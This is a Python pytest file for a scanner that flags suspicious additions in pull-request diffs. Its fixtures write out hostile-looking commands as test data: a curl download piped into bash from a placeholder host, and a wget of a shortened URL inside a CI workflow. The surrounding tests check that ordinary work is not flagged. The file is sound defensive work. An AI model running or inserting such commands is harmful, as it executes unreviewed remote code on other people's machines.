"""Every gate here watches what leaves. Nothing watched what a diff brings in.

`gitleaks` runs over the full history, because a secret committed and later deleted is still leaked.
Three CVE audits watch what is installed. `npm audit signatures` closes the window a hash cannot.
Every one of them asks whether something is getting OUT, or whether a dependency is known-bad.

This repository is public, Apache-2.0, takes pull requests from anyone, and its own policy is
auto-merge except for billing, destructive migrations, RLS and secrets. A line adding a `curl` to a
URL shortener inside `.github/workflows/` or `install.sh` passes lint, mypy, pytest, gitleaks and all
three audits without touching anything any of them look at.

These are heuristics and are meant to be. Every rule has a legitimate use, so most of the weight
below is on the lines that must NOT be flagged — a scanner that cries at ordinary work is a scanner
somebody adds `--fail-on ""` to, and then it guards nothing.
"""

from __future__ import annotations

import subprocess
from pathlib import Path

import pytest

from scripts.pr_intent_scan import scan


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    """A real git repository with a base commit, because the scanner reads a real `git diff`."""
    def git(*args: str) -> None:
        subprocess.run(["git", *args], cwd=tmp_path, check=True, capture_output=True)

    git("init", "-q", "-b", "main")
    git("config", "user.email", "t@example.com")
    git("config", "user.name", "t")
    (tmp_path / "README.md").write_text("base\n", encoding="utf-8")
    git("add", "-A")
    git("commit", "-qm", "base")
    git("branch", "base")
    return tmp_path


def _adiciona(repo: Path, caminho: str, conteudo: str) -> None:
    alvo = repo / caminho
    alvo.parent.mkdir(parents=True, exist_ok=True)
    alvo.write_text(conteudo, encoding="utf-8")
    subprocess.run(["git", "add", "-A"], cwd=repo, check=True, capture_output=True)
    subprocess.run(["git", "commit", "-qm", "change"], cwd=repo, check=True, capture_output=True)


def _scan(repo: Path) -> list:
    import os

    anterior = os.getcwd()
    os.chdir(repo)
    try:
        return scan("base")
    finally:
        os.chdir(anterior)


# ------------------------------------------------------------------ what must be flagged


def test_a_download_piped_into_a_shell_is_high_anywhere(repo: Path) -> None:
    """The one shape with no benign reading in a diff: whatever the server sends today, executed."""
    _adiciona(repo, "docs/setup.md", "curl -sSL https://exemplo.com/i.sh | bash\n")

    achados = _scan(repo)

    # Not the ONLY finding: that line also ends in `.sh`, so `executable-url` fires too, and two
    # reasons to look at one line is right rather than a duplicate. Asserted as membership.
    assert any(f.rule == "pipe-to-shell" and f.severity == "high" for f in achados)


def test_a_shortened_url_in_a_workflow_is_high(repo: Path) -> None:
    """A shortened link hides its destination from the reviewer AND can be repointed after merge."""
    _adiciona(repo, ".github/workflows/ci.yml", "      run: wget https://bit.ly/abc123\n")

    achados = _scan(repo)

    assert any(f.rule == "shortened-url" and f.severity == "high" for f in achados)


def test_the_same_line_in_a_doc_is_only_medium(repo: Path) -> None:
    """Severity is about WHERE, not only what. A shortener in prose is worth a look; one in a file
    that executes on somebody else's machine is worth a stop."""
    _adiciona(repo, "docs/nota.md", "veja https://bit.ly/abc123\n")

    assert [f.severity for f in _scan(repo)] == ["medium"]


def test_an_executable_url_is_flagged(repo: Path) -> None:
    _adiciona(repo, "scripts/setup.sh", "wget https://exemplo.com/tool.tar.gz\n")

    assert any(f.rule == "executable-url" for f in _scan(repo))


def test_an_encoded_blob_in_an_executing_path_is_flagged(repo: Path) -> None:
    """Code a reviewer cannot read, in a place that runs it."""
    _adiciona(repo, "scripts/x.py", f'DADOS = "{"A" * 200}"\n')

    assert any(f.rule == "encoded-blob" for f in _scan(repo))


# ------------------------------------------------------------------ what must NOT be flagged


LIMPO = [
    ("chimera/core/x.py", "def somar(a: int, b: int) -> int:\n    return a + b\n", "código comum"),
    ("docs/guia.md", "veja https://github.com/brcampidelli/chimera-agent/pull/283\n", "um link do repo"),
    ("docs/guia.md", "a documentação está em https://docs.python.org/3/library/json.html\n", "docs"),
    (".github/workflows/ci.yml", "      run: python -m pytest tests/ -q\n", "um passo de CI comum"),
    ("scripts/x.py", 'CHAVE = "sk-proj-" + os.environ["X"]\n', "concatenação curta"),
    ("tests/test_x.py", f'BLOB = "{"A" * 200}"\n', "um blob num teste, que não executa em CI"),
    ("pyproject.toml", '  "httpx>=0.27",\n', "uma dependência comum"),
]


@pytest.mark.parametrize(("caminho", "conteudo", "porque"), LIMPO)
def test_ordinary_work_is_not_flagged(repo: Path, caminho: str, conteudo: str, porque: str) -> None:
    """The constraint that decides whether this gate survives contact with the project.

    A scanner that cries at ordinary work is one somebody switches off, and a gate that is off
    guards nothing. The blob-in-a-test case is the sharpest: the same string in `scripts/` is a
    finding and here it is a fixture, because only one of those runs on CI.
    """
    _adiciona(repo, caminho, conteudo)

    assert _scan(repo) == [], porque


def test_it_does_not_flag_itself(repo: Path) -> None:
    """This file describes the patterns it looks for, so scanning it finds every one of them.

    Excluded by PATH, not by a marker comment: a marker is something a contributor can copy into
    the file they are adding.
    """
    fonte = Path(__file__).resolve().parents[1] / "scripts" / "pr_intent_scan.py"
    _adiciona(repo, "scripts/pr_intent_scan.py", fonte.read_text(encoding="utf-8"))

    assert _scan(repo) == []


def test_an_unchanged_line_near_a_change_is_not_an_addition(repo: Path) -> None:
    """`--unified=0`, so context is never read as an addition — otherwise every PR that edits a file
    near an existing `curl` line inherits that line's finding."""
    _adiciona(repo, "scripts/setup.sh", "curl -sSL https://exemplo.com/i.sh | bash\necho a\n")
    subprocess.run(["git", "branch", "-f", "base", "HEAD"], cwd=repo, check=True, capture_output=True)
    _adiciona(repo, "scripts/setup.sh", "curl -sSL https://exemplo.com/i.sh | bash\necho b\n")

    assert _scan(repo) == []
